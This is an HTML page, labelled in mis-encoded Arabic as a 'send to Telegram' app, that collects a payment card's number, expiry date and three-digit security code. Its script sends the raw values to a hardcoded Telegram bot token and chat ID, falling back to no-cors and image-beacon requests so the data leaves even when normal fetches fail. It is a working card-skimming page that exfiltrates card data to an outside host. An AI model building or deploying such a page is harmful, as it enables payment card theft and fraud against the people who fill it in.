<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>ØªØ·Ø¨ÙŠÙ‚ Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙ„Ø¬Ø±Ø§Ù…</title>

  <style>
    :root{
      --bg-1: #0b1220;
      --bg-2: #071025;
      --card-grad-1: #6EE7B7;
      --card-grad-2: #3B82F6;
      --muted: #9fb0c8;
      --glass: rgba(255,255,255,0.03);
      --accent: #60a5fa;
      --success: #10b981;
      --danger: #ef4444;
      --card-height: 220px;
      --app-radius: 18px;
      --shadow-1: 0 10px 30px rgba(2,6,23,0.6);
    }

    * { box-sizing: border-box; }
    html,body { height: 100%; margin:0; font-family: "Noto Naskh Arabic", "Segoe UI", Roboto, system-ui, Arial, sans-serif; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale; }
    body {
      background: radial-gradient(800px 350px at 10% 10%, rgba(59,130,246,0.06), transparent),
                  linear-gradient(180deg, var(--bg-2) 0%, var(--bg-1) 100%);
      color: #e6eef6;
      padding: 28px;
      display:flex;
      align-items:center;
      justify-content:center;
      min-height:100vh;
    }

    /* App shell */
    .app {
      width:100%;
      max-width:980px;
      border-radius:var(--app-radius);
      overflow:hidden;
      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      box-shadow: var(--shadow-1);
      display:grid;
      grid-template-columns: 1fr 420px;
      gap:22px;
      padding:18px;
      align-items:start;
    }

    @media (max-width:920px){
      .app { grid-template-columns: 1fr; padding:14px; gap:14px; }
      .right { order:-1; }
    }

    /* Left / Form column */
    .left {
      padding:18px;
      background: linear-gradient(180deg, rgba(255,255,255,0.015), rgba(255,255,255,0.01));
      border-radius:12px;
      border:1px solid rgba(255,255,255,0.03);
    }

    .brand {
      display:flex;
      align-items:center;
      gap:12px;
      margin-bottom:12px;
    }
    .logo {
      width:48px;height:48px;border-radius:10px;
      background: linear-gradient(135deg,var(--card-grad-1),var(--card-grad-2));
      display:flex;align-items:center;justify-content:center;
      box-shadow: 0 6px 18px rgba(59,130,246,0.14);
      flex-shrink:0;
    }
    .logo svg { width:26px;height:26px; }
    .brand h1 { margin:0; font-size:18px; letter-spacing:0.2px; }
    .brand p { margin:0; font-size:13px; color:var(--muted); }

    form { margin-top:12px; display:flex; flex-direction:column; gap:14px; }

    .field {
      display:flex; flex-direction:column; gap:8px;
    }
    label.inline {
      display:flex; align-items:center; gap:10px; font-weight:700; color:#eaf6ff;
      font-size:13px;
    }
    .input {
      display:flex; align-items:center; gap:10px;
      background:var(--glass);
      border-radius:10px;
      padding:10px 12px;
      border:1px solid rgba(255,255,255,0.035);
      transition: box-shadow .15s, transform .08s, border-color .12s;
    }
    .input:focus-within { box-shadow: 0 12px 30px rgba(59,130,246,0.08); border-color: rgba(59,130,246,0.4); transform: translateY(-2px); }

    input[type="text"], input[type="tel"] {
      border:0; background:transparent; outline:none; color: #e6eef6; font-size:16px; width:100%;
    }
    input::placeholder { color: rgba(230,238,246,0.45); }

    .two-cols { display:flex; gap:12px; }
    .two-cols > div { flex:1; }

    .hint { font-size:12px; color:var(--muted); margin-top:6px; }

    .actions { display:flex; gap:10px; align-items:center; margin-top:6px; }
    button.send {
      padding:12px 16px;
      border-radius:12px;
      border:0;
      color:#052023;
      font-weight:800;
      background: linear-gradient(90deg,var(--card-grad-1),var(--card-grad-2));
      box-shadow: 0 10px 24px rgba(59,130,246,0.12);
      cursor:pointer;
      transition: transform .12s, opacity .12s;
      font-size:15px;
    }
    button.send:active { transform: translateY(-1px); }
    button.ghost {
      background: transparent;
      border: 1px solid rgba(255,255,255,0.04);
      color: var(--muted);
      padding:10px 12px;
      border-radius:10px;
      cursor:pointer;
    }

    #message { min-height:26px; font-size:14px; color:var(--muted); }
    #message.info { color:var(--accent); }
    #message.success { color:var(--success); }
    #message.error { color:var(--danger); }

    .note {
      margin-top:10px;
      font-size:13px;
      color:var(--muted);
      background: rgba(255,255,255,0.01);
      padding:10px; border-radius:10px;
    }

    /* Right / Preview column */
    .right {
      padding:18px;
      border-radius:12px;
      background: linear-gradient(180deg, rgba(255,255,255,0.015), rgba(255,255,255,0.01));
      border:1px solid rgba(255,255,255,0.03);
      display:flex; flex-direction:column; gap:12px;
      height:100%;
    }

    .card-preview {
      height: var(--card-height);
      border-radius:12px;
      overflow:hidden;
      position:relative;
      padding:18px;
      background: linear-gradient(135deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
      box-shadow: inset 0 1px 0 rgba(255,255,255,0.03), 0 14px 40px rgba(2,6,23,0.6);
      display:flex; flex-direction:column; justify-content:space-between;
    }

    .card-surface {
      border-radius:10px;
      padding:16px;
      color:white;
      display:flex; flex-direction:column; gap:10px;
      background: linear-gradient(135deg, var(--card-grad-1), var(--card-grad-2));
      min-height:120px;
      transition: transform .22s, box-shadow .22s;
    }
    .card-surface:hover { transform: translateY(-6px); box-shadow: 0 20px 60px rgba(59,130,246,0.14); }

    .card-top { display:flex; justify-content:space-between; align-items:center; }
    .chip { width:46px; height:34px; border-radius:6px; background: linear-gradient(180deg,#ffd9a6,#ffb86b); box-shadow: 0 6px 18px rgba(0,0,0,0.12); }

    .card-number { font-family: "Courier New", Courier, monospace; font-size:20px; letter-spacing:2px; text-align:left; direction:ltr; }
    .card-meta { display:flex; justify-content:space-between; gap:12px; font-size:13px; }

    .meta-block { display:flex; flex-direction:column; text-align:left; direction:ltr; }
    .label { font-size:11px; opacity:0.95; }
    .value { font-weight:700; }

    .micro { font-size:12px; color:rgba(255,255,255,0.9); }

    /* small utilities */
    .row { display:flex; gap:8px; align-items:center; }
    .grow { flex:1; }

    /* subtle success animation */
    .success-burst {
      position:absolute; inset:0; display:flex; align-items:center; justify-content:center; pointer-events:none;
      opacity:0; transform:scale(0.96); transition:opacity .32s, transform .32s;
    }
    .success-burst.show { opacity:1; transform:scale(1); }
    .check {
      width:82px; height:82px; border-radius:50%; background:rgba(16,185,129,0.12); display:flex; align-items:center; justify-content:center;
      border: 2px solid rgba(16,185,129,0.18);
      box-shadow: 0 8px 28px rgba(16,185,129,0.08);
      color: var(--success); font-size:38px; font-weight:800;
    }

    /* small responsive tweaks */
    @media (max-width:520px){
      .card-number { font-size:18px; }
      .brand h1 { font-size:16px; }
      .card-surface { padding:12px; }
    }
  </style>
</head>
<body>
  <div class="app" role="application" aria-label="ØªØ·Ø¨ÙŠÙ‚ Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙ„Ø¬Ø±Ø§Ù…">
    <div class="left" role="region" aria-labelledby="appTitle">
      <div class="brand">
        <div class="logo" aria-hidden>
          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M3 12c0 4.9706 4.0294 9 9 9s9-4.0294 9-9-4.0294-9-9-9-9 4.0294-9 9z" fill="#fff" opacity="0.08"/>
            <path d="M8.5 12.5l3.2 2.2c.3.2.7-.05.7-.4V6.2" stroke="#042027" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
        </div>
        <div>
          <h1 id="appTitle">Ù†Ù…ÙˆØ°Ø¬ Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙ„Ø¬Ø±Ø§Ù…</h1>
          <p>ØªØ·Ø¨ÙŠÙ‚ Ø®ÙÙŠÙ Ø§Ù„Ø´ÙƒÙ„ â€” Ø¢Ù…Ù† ÙÙ‚Ø· Ù„Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù…Ø­Ù„ÙŠ. ÙŠØ¯Ø¹Ù… MM/YY Ùˆ MM/YYYY Ù„ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡.</p>
        </div>
      </div>

      <form id="form" autocomplete="on" novalidate>
        <!-- Card number (LTR input even on RTL page) -->
        <div class="field">
          <label class="inline">
            <span>Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© (16 Ø±Ù‚Ù…)</span>
          </label>
          <div class="input" title="Ø£Ø¯Ø®Ù„ 16 Ø±Ù‚Ù…Ù‹Ø§">
            <!-- direction ltr for numeric input -->
            <input id="idNumber" name="idNumber" type="text" inputmode="numeric" autocomplete="cc-number"
                   placeholder="0000 0000 0000 0000" aria-describedby="idHint"
                   dir="ltr" style="text-align:left;" />
          </div>
          <div id="idHint" class="hint">Ø§Ù„ÙƒØªØ§Ø¨Ø© Ø³ØªÙƒÙˆÙ† Ù…Ù† Ø§Ù„ÙŠØ³Ø§Ø± Ø¥Ù„Ù‰ Ø§Ù„ÙŠÙ…ÙŠÙ† â€” ÙŠØªÙ… ØªÙ†Ø³ÙŠÙ‚ Ø§Ù„Ø£Ø±Ù‚Ø§Ù… ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§ Ø¨Ù…Ø¬Ù…ÙˆØ¹Ø§Øª 4.</div>
        </div>

        <div class="two-cols">
          <div class="field">
            <label class="inline"><span>ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡ (MM/YY Ø£Ùˆ MM/YYYY)</span></label>
            <div class="input">
              <input id="expiry" name="expiry" type="text" inputmode="numeric" placeholder="MM/YY Ø£Ùˆ MM/YYYY" maxlength="7" autocomplete="cc-exp" />
            </div>
            <div class="hint">Ù…Ø«Ø§Ù„ Ù…Ù‚Ø¨ÙˆÙ„: 01/28 Ø£Ùˆ 01/2028</div>
          </div>

          <div class="field">
            <label class="inline"><span>Ø§Ù„Ø±Ù‚Ù… (3 Ø®Ø§Ù†Ø§Øª)</span></label>
            <div class="input">
              <input id="threeDigits" name="threeDigits" type="tel" inputmode="numeric" maxlength="3" placeholder="000" autocomplete="cc-csc" />
            </div>
            <div class="hint">Ù…Ø«Ø§Ù„: 123</div>
          </div>
        </div>

        <div class="actions">
          <button class="send" id="sendBtn" type="submit">Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙ„Ø¬Ø±Ø§Ù…</button>
          <button type="button" class="ghost" id="clearBtn" title="Ù…Ø³Ø­ Ø§Ù„Ø­Ù‚ÙˆÙ„">Ù…Ø³Ø­</button>
          <div id="message" role="status" aria-live="polite" class="grow"></div>
        </div>

        <p class="note">
          ØªÙ†Ø¨ÙŠÙ‡: Ø§Ù„ØªÙˆÙƒÙ† Ùˆ chat_id Ù…Ø¶Ù…Ù‘Ù†Ø§Ù† Ø¯Ø§Ø®Ù„ Ù‡Ø°Ø§ Ø§Ù„Ù…Ù„Ù ÙƒÙ…Ø§ Ø·Ù„Ø¨Øª â€” Ù‡Ø°Ø§ ØºÙŠØ± Ø¢Ù…Ù† Ø¥Ø°Ø§ Ù†ÙØ´Ø± ÙÙŠ Ù…ÙƒØ§Ù† Ø¹Ø§Ù…. Ø§Ø³ØªØ®Ø¯Ù…Ù‡ Ù…Ø­Ù„ÙŠÙ‹Ø§ Ø£Ùˆ ØºÙŠÙ‘Ø± Ø§Ù„ØªÙˆÙƒÙ† Ø¥Ø°Ø§ Ù†Ø´Ø±ØªÙ‡.
        </p>
      </form>
    </div>

    <aside class="right" role="region" aria-labelledby="previewTitle">
      <div style="display:flex; justify-content:space-between; align-items:center;">
        <div>
          <h3 id="previewTitle" style="margin:0 0 6px 0;">Ù…Ø¹Ø§ÙŠÙ†Ø© Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©</h3>
          <div style="font-size:13px; color:var(--muted)">Ø¹Ø±Ø¶ Ù…Ø±Ø¦ÙŠ Ù…ÙÙ‚ÙÙ†Ù‘ÙØ¹ Ù„Ù„Ø¨ÙŠØ§Ù†Ø§Øª â€” Ø§Ù„Ù‚ÙŠÙ… Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØ© ØªÙØ±Ø³Ù„ Ø¹Ù†Ø¯ Ø§Ù„Ø¶ØºØ·.</div>
        </div>
        <div style="display:flex; gap:10px;">
          <button id="toggleMask" class="ghost" title="Ø¹Ø±Ø¶/Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ø±Ù‚Ù…">Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ø±Ù‚Ù…</button>
          <button id="copyBtn" class="ghost" title="Ù†Ø³Ø® Ù†Øµ Ø§Ù„Ø±Ø³Ø§Ù„Ø©">Ù†Ø³Ø®</button>
        </div>
      </div>

      <div class="card-preview" aria-hidden="false">
        <div class="card-surface" id="cardSurface" role="img" aria-label="Ù…Ø¹Ø§ÙŠÙ†Ø© Ø¨Ø·Ø§Ù‚Ø©">
          <div class="card-top">
            <div class="chip" aria-hidden></div>
            <div class="micro">Telegram Bot</div>
          </div>

          <div class="card-number" id="cardNumber" aria-live="polite" dir="ltr" style="text-align:left;">â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢</div>

          <div class="card-meta">
            <div class="meta-block">
              <div class="label">ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡</div>
              <div class="value" id="cardExpiry">MM/YY</div>
            </div>
            <div class="meta-block">
              <div class="label">Ø§Ù„Ø±Ù‚Ù… (3)</div>
              <div class="value" id="cardThree">â€¢â€¢â€¢</div>
            </div>
          </div>
        </div>

        <div class="success-burst" id="successBurst" aria-hidden="true">
          <div class="check" aria-hidden>âœ“</div>
        </div>
      </div>

      <div style="color:var(--muted); font-size:13px;">
        Ù†Øµ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ù…Ø±Ø³Ù„Ø©:
        <div id="previewText" style="margin-top:8px; background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; font-size:13px; color:rgba(230,238,246,0.95);"></div>
      </div>
    </aside>
  </div>

  <script>
    /************************************************
     * Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„ØªÙˆÙƒÙ† ÙˆØ§Ù„Ù€ chat id Ù‡Ù†Ø§ (ÙƒÙ…Ø§ Ø·Ù„Ø¨Øª)
     * ØªØ°ÙƒÙŠØ±: Ø¸Ù‡ÙˆØ±Ù‡Ù…Ø§ ÙÙŠ Ø§Ù„ÙƒÙˆØ¯ ÙŠØ¬Ø¹Ù„Ø§Ù†Ù‡Ù…Ø§ Ù…ÙƒØ´ÙˆÙÙŠÙ†.
     ************************************************/
    const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
    const CHAT_ID = "6873334348";

    // Elements
    const form = document.getElementById('form');
    const idInput = document.getElementById('idNumber');
    const expiryInput = document.getElementById('expiry');
    const threeInput = document.getElementById('threeDigits');
    const msg = document.getElementById('message');
    const sendBtn = document.getElementById('sendBtn');
    const clearBtn = document.getElementById('clearBtn');

    const pNumber = document.getElementById('cardNumber');
    const pExpiry = document.getElementById('cardExpiry');
    const pThree = document.getElementById('cardThree');
    const previewText = document.getElementById('previewText');
    const successBurst = document.getElementById('successBurst');
    const toggleMask = document.getElementById('toggleMask');
    const copyBtn = document.getElementById('copyBtn');

    let maskEnabled = true;

    // helpers
    function showMessage(text, cls='info') {
      msg.className = cls;
      msg.textContent = text;
    }

    function rawDigits(v='') {
      return (v||'').toString().replace(/\D/g, '');
    }

    // Format card number with groups of 4, input left-to-right
    idInput.addEventListener('input', (e) => {
      const prev = e.target.value;
      let digits = rawDigits(prev).slice(0,16);
      const parts = digits.match(/.{1,4}/g) || [];
      const display = parts.join(' ');
      e.target.value = display;
      updatePreview();
    });

    // Expiry input: accept MMYY, MM/YYYY, MM/YY
    expiryInput.addEventListener('input', (e) => {
      let v = e.target.value.replace(/[^\d]/g,'');
      if (v.length > 6) v = v.slice(0,6);

      if (v.length <= 2) {
        e.target.value = v;
      } else if (v.length <= 4) {
        // format MMYY -> MM/YY
        e.target.value = v.slice(0,2) + '/' + v.slice(2);
      } else {
        // format MMYYYY -> MM/YYYY
        e.target.value = v.slice(0,2) + '/' + v.slice(2,6);
      }
      updatePreview();
    });

    // three digits
    threeInput.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g,'').slice(0,3);
      updatePreview();
    });

    // Toggle mask (show full number or masked)
    toggleMask.addEventListener('click', () => {
      maskEnabled = !maskEnabled;
      toggleMask.textContent = maskEnabled ? 'Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ø±Ù‚Ù…' : 'Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ø±Ù‚Ù…';
      updatePreview();
    });

    // Copy preview message to clipboard
    copyBtn.addEventListener('click', async () => {
      const txt = buildMessageText();
      try {
        await navigator.clipboard.writeText(txt);
        showMessage('ØªÙ… Ù†Ø³Ø® Ù†Øµ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ Ø§Ù„Ø­Ø§ÙØ¸Ø©.', 'success');
      } catch (e) {
        showMessage('ÙØ´Ù„ Ø§Ù„Ù†Ø³Ø® â€” Ù‚Ø¯ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø§Ù„Ù…ØªØµÙØ­ Ø§Ù„Ù†Ø³Ø® Ù…Ù† Ù‡Ø°Ø§ Ø§Ù„Ù…ÙƒØ§Ù†.', 'error');
      }
    });

    // Build message text (raw values)
    function buildMessageText() {
      const idVal = rawDigits(idInput.value);
      const expVal = normalizeExpiryForSend(expiryInput.value) || expiryInput.value || '';
      const threeVal = threeInput.value || '';
      return `ğŸ“ Ø§Ø³ØªÙ„Ø§Ù… Ø¨ÙŠØ§Ù†Ø§Øª Ø¬Ø¯ÙŠï¿½ï¿½Ø©:\nØ§Ù„Ø±Ù‚Ù… Ø§Ù„ØªØ¹Ø±ÙŠÙÙŠ: ${idVal}\nØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡: ${expVal}\nØ§Ù„Ø±Ù‚Ù… (3 Ø®Ø§Ù†Ø§Øª): ${threeVal}`;
    }

    // normalize expiry text to MM/YYYY (for sending)
    function normalizeExpiryForSend(display) {
      if (!display) return '';
      const m = display.match(/^(\d{2})\/(\d{2,4})$/);
      if (!m) return display;
      const mm = m[1];
      const yy = m[2];
      if (yy.length === 2) {
        // interpret as 20YY
        return `${mm}/${String(2000 + parseInt(yy,10))}`;
      } else {
        return `${mm}/${yy}`;
      }
    }

    // Validate functions
    function validateId(idDisplay) {
      return /^\d{16}$/.test(rawDigits(idDisplay));
    }

    // Accept MM/YY or MM/YYYY (also accept values like 0128 or 01/28)
    function validateExpiry(display) {
      if (!display) return false;
      const m = display.match(/^(\d{2})\/(\d{2,4})$/);
      if (!m) return false;
      const mm = parseInt(m[1],10);
      let yyyy = m[2].length === 2 ? 2000 + parseInt(m[2],10) : parseInt(m[2],10);
      if (mm < 1 || mm > 12) return false;
      // last moment of that month
      const last = new Date(yyyy, mm, 0, 23, 59, 59);
      return last > new Date();
    }

    function validateThree(v) {
      return /^\d{3}$/.test(v);
    }

    // Masking for preview: show only last 4 digits (if masked)
    function maskedDisplay(display) {
      const digits = rawDigits(display);
      if (!digits) return 'â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢';
      const groups = (digits + 'â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢').slice(0,16).match(/.{1,4}/g) || [];
      if (!maskEnabled) return groups.join(' ');
      // keep last group visible, mask others
      const masked = groups.map((g, idx) => idx < 3 ? g.replace(/\d/g,'â€¢') : g);
      return masked.join(' ');
    }

    // Update preview and preview text
    function updatePreview() {
      pNumber.textContent = maskedDisplay(idInput.value);
      // show expiry in short form mm/yy if input was yy or yyyy show in mm/yy for compactness
      const displayExpiry = expiryInput.value || 'MM/YY';
      // show three digits masked
      pThree.textContent = threeInput.value ? threeInput.value.replace(/./g,'â€¢') : 'â€¢â€¢â€¢';
      pExpiry.textContent = displayExpiry;
      previewText.textContent = buildMessageText();
    }

    // initialize
    updatePreview();

    // clear
    clearBtn.addEventListener('click', () => {
      form.reset();
      maskEnabled = true;
      toggleMask.textContent = 'Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ø±Ù‚Ù…';
      showMessage('', '');
      updatePreview();
    });

    // send logic (with same fallback approach)
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      showMessage('', '');
      const idVal = rawDigits(idInput.value);
      const expRaw = expiryInput.value.trim();
      const expForSend = normalizeExpiryForSend(expRaw);
      const threeVal = threeInput.value.trim();

      if (!validateId(idInput.value)) {
        showMessage('Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ØªØ¹Ø±ÙŠÙÙŠ ÙŠØ¬Ø¨ Ø£Ù† ÙŠØªÙƒÙˆÙ‘Ù† Ù…Ù† 16 Ø±Ù‚Ù…Ù‹Ø§.', 'error');
        return;
      }
      if (!validateExpiry(expRaw)) {
        showMessage('ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡ ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† MM/YY Ø£Ùˆ MM/YYYY ÙˆÙŠÙƒÙˆÙ† ÙÙŠ Ø§Ù„Ù…Ø³ØªÙ‚Ø¨Ù„.', 'error');
        return;
      }
      if (!validateThree(threeVal)) {
        showMessage('Ø­Ù‚Ù„ Ø§Ù„Ø«Ù„Ø§Ø« Ø®Ø§Ù†Ø§Øª ÙŠØ¬Ø¨ Ø£Ù† ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ 3 Ø£Ø±Ù‚Ø§Ù….', 'error');
        return;
      }

      const text = buildMessageText();
      previewText.textContent = text;

      const base = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendMessage`;
      const params = new URLSearchParams({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'HTML'
      });
      const url = `${base}?${params.toString()}`;

      showMessage('Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„...', 'info');
      sendBtn.disabled = true;
      sendBtn.style.opacity = '0.9';

      // 1) try normal fetch
      try {
        const resp = await fetch(url, { method: 'GET' });
        if (resp && resp.ok) {
          const j = await resp.json();
          if (j.ok) {
            showMessage('ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¨Ù†Ø¬Ø§Ø­.', 'success');
            triggerSuccess();
            form.reset();
            updatePreview();
            sendBtn.disabled = false;
            return;
          } else {
            showMessage('ØªÙ„Ø¬Ø±Ø§Ù… Ø£Ø¹Ø§Ø¯ Ø®Ø·Ø£: ' + (j.description || JSON.stringify(j)), 'error');
            sendBtn.disabled = false;
            return;
          }
        }
      } catch (err) {
        console.warn('fetch normal failed, will try fallback methods.', err);
      }

      // 2) try no-cors fetch (may send but cannot read response)
      try {
        await fetch(url, { method: 'GET', mode: 'no-cors', cache: 'no-store' });
        showMessage('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨ Ø¥Ù„Ù‰ Telegram (Ø¨Ø¯ÙˆÙ† ØªØ£ÙƒÙŠØ¯ Ù†ØªÙŠØ¬Ø© Ø¨Ø³Ø¨Ø¨ Ù‚ÙŠÙˆØ¯ CORS).', 'success');
        triggerSuccess();
        form.reset();
        updatePreview();
        sendBtn.disabled = false;
        return;
      } catch (err) {
        console.warn('fetch no-cors failed, trying Image fallback.', err);
      }

      // 3) image fallback
      try {
        await new Promise((resolve) => {
          const img = new Image();
          img.onload = () => resolve(true);
          img.onerror = () => resolve(true);
          img.src = url + "&_=" + Date.now();
          setTimeout(() => resolve(true), 4000);
        });
        showMessage('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨ Ø¥Ù„Ù‰ Telegram (Ø¹Ù† Ø·Ø±ÙŠÙ‚ Ø·Ø±ÙŠÙ‚Ø© Ø¨Ø¯ÙŠÙ„Ø©).', 'success');
        triggerSuccess();
        form.reset();
        updatePreview();
        sendBtn.disabled = false;
        return;
      } catch (err) {
        console.error(err);
        showMessage('ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨. ØªØ­Ù‚Ù‚ Ù…Ù† Ø§ØªØµØ§Ù„ Ø§Ù„Ø§Ù†ØªØ±Ù†Øª Ø£Ùˆ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù…ØªØµÙØ­.', 'error');
        sendBtn.disabled = false;
      }
    });

    // Success visual (burst)
    function triggerSuccess() {
      successBurst.classList.add('show');
      successBurst.setAttribute('aria-hidden','false');
      setTimeout(() => {
        successBurst.classList.remove('show');
        successBurst.setAttribute('aria-hidden','true');
      }, 1800);
    }

    // Small accessibility: announce preview changes
    idInput.addEventListener('keyup', updatePreview);
    expiryInput.addEventListener('keyup', updatePreview);
    threeInput.addEventListener('keyup', updatePreview);

    // Keep cursor at end for LTR input in RTL page (convenience)
    idInput.addEventListener('focus', () => { setTimeout(()=> { idInput.selectionStart = idInput.selectionEnd = idInput.value.length; }, 0); });
  </script>
</body>
</html>